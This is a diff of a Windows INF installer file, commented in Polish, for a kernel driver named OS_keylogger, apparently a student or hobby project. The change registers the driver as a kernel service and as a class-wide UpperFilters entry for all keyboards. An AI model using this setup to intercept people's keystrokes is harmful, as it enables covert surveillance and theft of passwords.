@@ -1,18 +1,20 @@
 ;
 ; OS_keylogger.inf
 ;
+; Instalacja sterownika filtra klawiatury (Keyboard Class Filter)
+;
 
 [Version]
 Signature   = "$WINDOWS NT$"
-Class       = System ; TODO: specify appropriate Class
-ClassGuid   = {4d36e97d-e325-11ce-bfc1-08002be10318} ; TODO: specify appropriate ClassGuid
-Provider    = %ManufacturerName%
+Class       = Keyboard
+ClassGuid   = {4d36e96b-e325-11ce-bfc1-08002be10318}
+Provider    = %ProviderName%
+DriverVer   = 12/29/2025,1.0.0.0
 CatalogFile = OS_keylogger.cat
-DriverVer   = ; TODO: set DriverVer in stampinf property pages
 PnpLockdown = 1
 
 [DestinationDirs]
-DefaultDestDir = 13
+DefaultDestDir = 12 ; Katalog C:\Windows\System32\drivers
 
 [SourceDisksNames]
 1 = %DiskName%,,,""
@@ -20,43 +22,42 @@ DefaultDestDir = 13
 [SourceDisksFiles]
 OS_keylogger.sys = 1,,
 
-;*****************************************
-; Install Section
-;*****************************************
+; ================= Sekcja Instalacji (DefaultInstall) =================
 
-[Manufacturer]
-%ManufacturerName% = Standard,NT$ARCH$.10.0...16299 ; %13% support introduced in build 16299
+[DefaultInstall.NTamd64]
+CopyFiles = DriverFiles
 
-[Standard.NT$ARCH$.10.0...16299]
-%OS_keylogger.DeviceDesc% = OS_keylogger_Device, Root\OS_keylogger ; TODO: edit hw-id
+[DefaultInstall.NTamd64.Services]
+AddService = OS_keylogger,, Service_Inst
 
-[OS_keylogger_Device.NT]
-CopyFiles = File_Copy
+[DefaultInstall.NTamd64.HW]
+AddReg = Filter_AddReg
 
-[File_Copy]
+; ================= Kopiowanie Plików =================
+
+[DriverFiles]
 OS_keylogger.sys
 
-;-------------- Service installation
-[OS_keylogger_Device.NT.Services]
-AddService = OS_keylogger,%SPSVCINST_ASSOCSERVICE%, OS_keylogger_Service_Inst
+; ================= Rejestracja Filtra =================
 
-; -------------- OS_keylogger driver install sections
-[OS_keylogger_Service_Inst]
-DisplayName    = %OS_keylogger.SVCDESC%
+[Filter_AddReg]
+; Klucz: HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e96b...}
+; Wartoœæ: UpperFilters
+; Typ: REG_MULTI_SZ_APPEND (0x00010008)
+HKR,,"UpperFilters",0x00010008,"OS_keylogger"
+
+; ================= Konfiguracja Us³ugi =================
+
+[Service_Inst]
+DisplayName    = %ServiceDesc%
 ServiceType    = 1               ; SERVICE_KERNEL_DRIVER
 StartType      = 3               ; SERVICE_DEMAND_START
 ErrorControl   = 1               ; SERVICE_ERROR_NORMAL
-ServiceBinary  = %13%\OS_keylogger.sys
+ServiceBinary  = %12%\OS_keylogger.sys
 
-[OS_keylogger_Device.NT.Wdf]
-KmdfService = OS_keylogger, OS_keylogger_wdfsect
-
-[OS_keylogger_wdfsect]
-KmdfLibraryVersion = $KMDFVERSION$
+; ================= Ci¹gi Znaków (Strings) =================
 
 [Strings]
-SPSVCINST_ASSOCSERVICE = 0x00000002
-ManufacturerName = "<Your manufacturer name>" ;TODO: Replace with your manufacturer name
-DiskName = "OS_keylogger Installation Disk"
-OS_keylogger.DeviceDesc = "OS_keylogger Device"
-OS_keylogger.SVCDESC = "OS_keylogger Service"
+ProviderName = "TwojaNazwa"
+DiskName     = "Dysk instalacyjny OS_keylogger"
+ServiceDesc  = "OS_keylogger Keyboard Filter Driver"
